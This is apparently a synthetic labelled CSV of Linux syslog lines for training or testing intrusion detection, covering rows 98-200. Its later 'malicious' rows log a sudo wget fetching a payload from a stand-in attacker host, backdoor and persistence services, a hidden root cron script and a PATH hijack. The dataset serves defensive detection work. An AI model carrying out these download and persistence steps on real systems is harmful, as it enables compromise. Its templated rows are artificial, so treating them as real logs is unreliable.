id,log_text,label
98,Jan 1 10:01:55 ubuntu sshd[2210]: Accepted password for user from 192.168.1.44 port 55822 ssh2,normal
99,Jan 5 10:49:58 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
100,Jan 12 19:09:12 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
101,Jan 21 18:29:35 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
102,Jan 5 07:32:13 kernel: [ 1234.56 ] USB device plugged in.,normal
103,Jan 9 08:54:01 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
104,Jan 1 17:09:26 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
105,Jan 8 00:47:43 ubuntu sshd[2210]: Accepted password for user from 192.168.1.211 port 55822 ssh2,normal
106,Jan 27 17:00:34 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
107,Jan 28 12:30:04 kernel: [ 1234.56 ] USB device plugged in.,normal
108,Jan 5 02:27:40 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
109,Jan 26 19:11:24 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
110,Jan 1 03:45:54 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
111,Jan 11 12:10:59 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
112,Jan 4 08:49:55 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
113,Jan 28 00:30:05 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
114,Jan 11 01:02:36 kernel: [ 1234.56 ] USB device plugged in.,normal
115,Jan 1 22:14:38 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
116,Jan 20 08:24:56 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
117,Jan 23 23:59:28 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
118,Jan 11 06:26:10 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
119,Jan 15 10:37:45 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
120,Jan 2 15:06:57 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
121,Jan 16 20:01:56 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
122,Jan 6 02:20:35 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
123,Jan 16 12:25:35 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
124,Jan 22 19:58:49 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
125,Jan 4 23:07:31 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
126,Jan 23 16:33:29 ubuntu sshd[2210]: Accepted password for user from 192.168.1.60 port 55822 ssh2,normal
127,Jan 16 07:08:31 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
128,Jan 23 09:48:36 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
129,Jan 4 08:48:23 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
130,Jan 8 16:26:01 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
131,Jan 9 07:54:44 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
132,Jan 16 01:32:17 ubuntu sshd[2210]: Accepted password for user from 192.168.1.202 port 55822 ssh2,normal
133,Jan 23 17:01:56 ubuntu CRON[4521]: (root) CMD (/usr/bin/apt update),normal
134,Jan 11 09:19:07 ubuntu sshd[2210]: Accepted password for user from 192.168.1.50 port 55822 ssh2,normal
135,Jan 1 11:03:06 ubuntu dbus-daemon[555]: Successfully activated service 'org.gnome.Settings',normal
136,Jan 25 06:51:29 ubuntu sshd[2210]: Accepted password for user from 192.168.1.170 port 55822 ssh2,normal
137,Jan 11 07:29:14 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
138,Jan 12 16:41:29 ubuntu systemd[1]: Stopping User Manager for UID 1000.,normal
139,Jan 14 18:51:49 ubuntu sshd[2210]: Accepted password for user from 192.168.1.200 port 55822 ssh2,normal
140,Jan 25 12:39:17 ubuntu systemd[123]: Started User Manager for UID 1000.,normal
141,Jan 4 02:34:55 ubuntu sudo[3201]: user : TTY=pts/0 ; PWD=/tmp ; COMMAND=/usr/bin/wget http://malicious.example.com/payload,malicious
142,Jan 23 03:27:58 ubuntu systemd[1]: Enabled suspicious service sys_backdoor.service,malicious
143,Jan 27 11:50:39 ubuntu sudo[3201]: user : TTY=pts/0 ; PWD=/tmp ; COMMAND=/usr/bin/wget http://malicious.example.com/payload,malicious
144,Jan 17 06:29:41 ubuntu systemd[1]: Created rogue service persistence-upd.service,malicious
145,Jan 6 04:01:49 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
146,Jan 14 08:36:39 ubuntu systemd[1]: Enabled suspicious service sys_backdoor.service,malicious
147,Jan 18 20:51:14 ubuntu kernel: Unauthorized access attempt detected at /etc/systemd/system/,malicious
148,Jan 13 22:51:43 ubuntu sudo[3201]: user : TTY=pts/0 ; PWD=/tmp ; COMMAND=/usr/bin/wget http://malicious.example.com/payload,malicious
149,Jan 1 03:42:05 ubuntu bash[5544]: Added PATH modification: /tmp/.update/:$PATH,malicious
150,Jan 17 11:19:56 ubuntu systemd[1]: Created rogue service persistence-upd.service,malicious
151,Jan 11 01:20:56 ubuntu systemd[1]: Created rogue service persistence-upd.service,malicious
152,Jan 23 12:33:51 ubuntu sudo[3201]: user : TTY=pts/0 ; PWD=/tmp ; COMMAND=/usr/bin/wget http://malicious.example.com/payload,malicious
153,Jan 23 10:42:42 ubuntu bash[5544]: Added PATH modification: /tmp/.update/:$PATH,malicious
154,Jan 8 07:08:13 ubuntu sudo[3201]: user : TTY=pts/0 ; PWD=/tmp ; COMMAND=/usr/bin/wget http://malicious.example.com/payload,malicious
155,Jan 16 07:14:10 ubuntu systemd[1]: Enabled suspicious service sys_backdoor.service,malicious
156,Jan 27 10:11:20 ubuntu systemd[1]: Enabled suspicious service sys_backdoor.service,malicious
157,Jan 18 13:36:16 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
158,Jan 22 02:02:51 ubuntu kernel: Unauthorized access attempt detected at /etc/systemd/system/,malicious
159,Jan 18 12:28:29 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
160,Jan 6 05:17:27 ubuntu bash[5544]: Added PATH modification: /tmp/.update/:$PATH,malicious
161,Jan 16 13:46:39 ubuntu systemd[1]: Created rogue service persistence-upd.service,malicious
162,Jan 2 19:39:11 ubuntu sudo[3201]: user : TTY=pts/0 ; PWD=/tmp ; COMMAND=/usr/bin/wget http://malicious.example.com/payload,malicious
163,Jan 28 21:45:50 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
164,Jan 16 09:29:55 ubuntu sudo[3201]: user : TTY=pts/0 ; PWD=/tmp ; COMMAND=/usr/bin/wget http://malicious.example.com/payload,malicious
165,Jan 3 01:02:54 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
166,Jan 3 22:05:50 ubuntu bash[5544]: Added PATH modification: /tmp/.update/:$PATH,malicious
167,Jan 12 14:03:37 ubuntu kernel: Unauthorized access attempt detected at /etc/systemd/system/,malicious
168,Jan 22 04:26:53 ubuntu sudo[3201]: user : TTY=pts/0 ; PWD=/tmp ; COMMAND=/usr/bin/wget http://malicious.example.com/payload,malicious
169,Jan 20 15:27:39 ubuntu kernel: Unauthorized access attempt detected at /etc/systemd/system/,malicious
170,Jan 28 09:01:03 ubuntu sudo[3201]: user : TTY=pts/0 ; PWD=/tmp ; COMMAND=/usr/bin/wget http://malicious.example.com/payload,malicious
171,Jan 27 12:51:28 ubuntu bash[5544]: Added PATH modification: /tmp/.update/:$PATH,malicious
172,Jan 9 10:20:02 ubuntu sudo[3201]: user : TTY=pts/0 ; PWD=/tmp ; COMMAND=/usr/bin/wget http://malicious.example.com/payload,malicious
173,Jan 27 05:34:39 ubuntu systemd[1]: Created rogue service persistence-upd.service,malicious
174,Jan 9 04:08:49 ubuntu bash[5544]: Added PATH modification: /tmp/.update/:$PATH,malicious
175,Jan 25 17:08:39 ubuntu sudo[3201]: user : TTY=pts/0 ; PWD=/tmp ; COMMAND=/usr/bin/wget http://malicious.example.com/payload,malicious
176,Jan 7 20:00:38 ubuntu bash[5544]: Added PATH modification: /tmp/.update/:$PATH,malicious
177,Jan 3 06:59:30 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
178,Jan 17 13:38:55 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
179,Jan 12 11:35:42 ubuntu systemd[1]: Enabled suspicious service sys_backdoor.service,malicious
180,Jan 4 18:45:11 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
181,Jan 1 00:39:16 ubuntu systemd[1]: Created rogue service persistence-upd.service,malicious
182,Jan 1 08:56:14 ubuntu bash[5544]: Added PATH modification: /tmp/.update/:$PATH,malicious
183,Jan 14 21:10:28 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
184,Jan 11 02:21:51 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
185,Jan 28 14:30:23 ubuntu kernel: Unauthorized access attempt detected at /etc/systemd/system/,malicious
186,Jan 11 02:22:49 ubuntu bash[5544]: Added PATH modification: /tmp/.update/:$PATH,malicious
187,Jan 27 21:09:19 ubuntu systemd[1]: Created rogue service persistence-upd.service,malicious
188,Jan 13 16:42:35 ubuntu kernel: Unauthorized access attempt detected at /etc/systemd/system/,malicious
189,Jan 2 14:36:21 ubuntu sudo[3201]: user : TTY=pts/0 ; PWD=/tmp ; COMMAND=/usr/bin/wget http://malicious.example.com/payload,malicious
190,Jan 9 00:43:47 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
191,Jan 10 21:41:02 ubuntu kernel: Unauthorized access attempt detected at /etc/systemd/system/,malicious
192,Jan 24 00:26:13 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
193,Jan 20 16:10:21 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
194,Jan 10 00:09:42 ubuntu kernel: Unauthorized access attempt detected at /etc/systemd/system/,malicious
195,Jan 21 10:06:51 ubuntu bash[5544]: Added PATH modification: /tmp/.update/:$PATH,malicious
196,Jan 12 06:41:42 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
197,Jan 3 14:12:03 ubuntu CRON[9902]: (root) CMD (/tmp/.cache/hidden/job.sh),malicious
198,Jan 27 04:46:58 ubuntu systemd[1]: Enabled suspicious service sys_backdoor.service,malicious
199,Jan 9 09:57:46 ubuntu bash[5544]: Added PATH modification: /tmp/.update/:$PATH,malicious
200,Jan 15 03:19:00 ubuntu kernel: Unauthorized access attempt detected at /etc/systemd/system/,malicious
